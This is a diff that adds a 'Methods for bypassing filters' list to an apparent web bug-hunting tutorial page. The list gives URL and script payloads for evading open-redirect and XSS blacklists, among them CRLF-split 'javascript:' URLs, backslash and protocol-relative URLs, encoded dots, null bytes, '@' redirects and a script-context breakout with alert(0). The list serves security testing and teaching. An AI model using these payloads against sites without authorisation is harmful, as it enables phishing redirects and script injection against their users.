@@ -152,6 +152,30 @@ An useful list to add while bruteforcing for subdirectory maybe <a href="https:/
 </ul>
 
 
+<h2><a href="https://zseano.com/tutorials/1.html">Methods for bypassing filters</a></h2>
+<ul><li>java%0d%0ascript%0d%0a:alert(0)<br>
+(crlf injection to bypass javascript: being blacklisted)</li>
+<li>//google.com<br>
+(incase http:// is blacklisted)</li>
+<li>https:google.com<br>
+(browsers accept this, good if // is blacklisted!)</li>
+<li>//google%E3%80%82com<br>
+(%E3%80%82 is 。 encoded. A HUGE thanks to filedescriptor for showing me that)</li>
+<li>\/\/google.com/<br>
+(useful for bypassing // http:// blacklists. Browsers see \/\/ as //)</li>
+<li>/\/google.com/<br>
+(same as above)</li>
+<li>//google%00.com<br>
+(null byte to bypasses blacklist filter. can be used anywhere)</li>
+<li>http://www.theirsite.com@yoursite.com/<br>
+(oldie, but browsers will redirect to anything after @)</li>
+<li>http://www.yoursite.com/http://www.theirsite.com/<br>
+(if @ is blacklisted and they check if their domain is in the param, make a folder as their domain :D)</li>
+<li>";alert(0);//<br>
+(example from above. if the url is echo'd in a variable and we want to get xss in script tag)</li>
+</ul>
+
+
  
 <h1>HTTP Parameter pollution</h1>
 
